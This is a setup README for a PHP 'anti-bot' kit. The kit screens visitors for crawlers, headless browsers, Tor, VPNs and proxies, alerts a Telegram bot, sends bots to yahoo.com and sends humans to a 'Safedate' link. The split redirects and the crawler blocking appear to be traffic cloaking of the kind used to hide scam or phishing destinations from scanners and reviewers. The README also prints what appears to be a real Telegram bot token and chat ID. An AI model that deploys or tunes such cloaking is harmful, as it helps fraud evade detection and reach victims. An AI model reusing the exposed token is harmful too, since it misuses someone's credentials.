# 🔒 Anti-Bot Protection System

## Configuration Complete ✅

Your Telegram bot is configured:
- **Bot Token:** 5225148453:AAGgkWAPvkayYpy0aS4zihFMxhhDNdocjvg
- **Chat ID:** 595807104
- **Redirect (Bots):** https://yahoo.com
- **Redirect (Humans):** https://risatek.link/Safedate

---

## 📋 Files Included

| File | Description |
|------|-------------|
| `YOUR-CONFIG.php` | Main configuration file with your settings |
| `index.php` | Verification page with reCAPTCHA |
| `verify-api.php` | API endpoint for AJAX verification |

---

## 🚀 Setup Instructions

### Step 1: Get reCAPTCHA Keys (REQUIRED)

1. Go to https://www.google.com/recaptcha/admin
2. Sign in with your Google account
3. Click "+" to create new site
4. Settings:
   - **Label:** Your site name
   - **reCAPTCHA Type:** reCAPTCHA v2 → "I'm not a robot" Checkbox
   - **Domains:** Your domain (e.g., yourdomain.com)
   - **Owners:** Your email
   - ✅ Check "Send alerts to owners"
5. Click **SUBMIT**
6. Copy the **Site Key** and **Secret Key**

### Step 2: Update Configuration

Open `YOUR-CONFIG.php` and replace:
```php
$recaptcha_site_key = "YOUR_RECAPTCHA_SITE_KEY_HERE";
$recaptcha_secret = "YOUR_RECAPTCHA_SECRET_KEY_HERE";
```

With your actual keys from Step 1.

### Step 3: Upload Files

Upload all files to your web server (PHP 7.0+ required):
```
/your-domain/
  ├── index.php
  ├── YOUR-CONFIG.php
  └── verify-api.php
```

### Step 4: Test

1. Visit your domain in browser
2. You should see verification page
3. Complete reCAPTCHA
4. Check your Telegram for notifications

---

## 🛡️ Bot Detection Methods (No API Required)

This system uses multiple detection layers:

1. **User Agent Analysis** - Detects known bots, crawlers, automation tools
2. **Headless Browser Detection** - Chrome Headless, Puppeteer, Playwright
3. **JavaScript Check** - Bots can't execute JS properly
4. **Mouse Movement** - Humans move mouse, bots don't
5. **Screen Resolution** - Real browsers report resolution
6. **Time Analysis** - Bots act too fast
7. **Tor Detection** - Blocks Tor exit nodes
8. **VPN/Proxy Detection** - Checks for proxy headers
9. **Honeypot Fields** - Hidden fields bots fill out
10. **reCAPTCHA v2** - Google's bot challenge

---

## 📱 Telegram Notifications

You'll receive alerts for:
- ✅ Human verifications (green)
- 🚫 Bot blocks (red)
- ⚠️ Failed CAPTCHA attempts (yellow)
- 🤖 Immediate bot detection (user agents)
- 🧅 Tor users blocked

---

## ⚙️ Configuration Options

In `YOUR-CONFIG.php`:

```php
// Anti-Detection Settings
$anti_proxy = "no";        // Change to "yes" to block proxies
$anti_vpn = "no";          // Change to "yes" to block VPNs  
$anti_tor = "yes";         // Block Tor (already enabled)
$anti_web_crawler = "yes"; // Block search crawlers
$max_fraud_score = "110";  // Lower = stricter (default: 110)

// Country Lock
$lock_country = "no";      // Change to "yes" + set country code to lock
```

---

## 🔧 Troubleshooting

### reCAPTCHA not showing?
- Check that keys are correct
- Domain must match exactly
- Use `www.` if your site uses it

### Telegram not receiving messages?
- Verify bot token is correct
- Make sure you sent `/start` to your bot
- Check chat ID is correct

### False positives (blocking real users)?
- Increase `$max_fraud_score` to 150
- Set `$anti_proxy = "no"`
- Set `$anti_vpn = "no"`

### Bots getting through?
- Lower `$max_fraud_score` to 80
- Set `$anti_proxy = "yes"`
- Set `$anti_vpn = "yes"`

---

## 📝 Security Notes

- Keep `YOUR-CONFIG.php` outside public_html if possible
- Never share your Telegram bot token
- reCAPTCHA secret key must stay server-side only
- Change file permissions to 644 after upload

---

Made for Anti-Bot Protection | No APIs Required
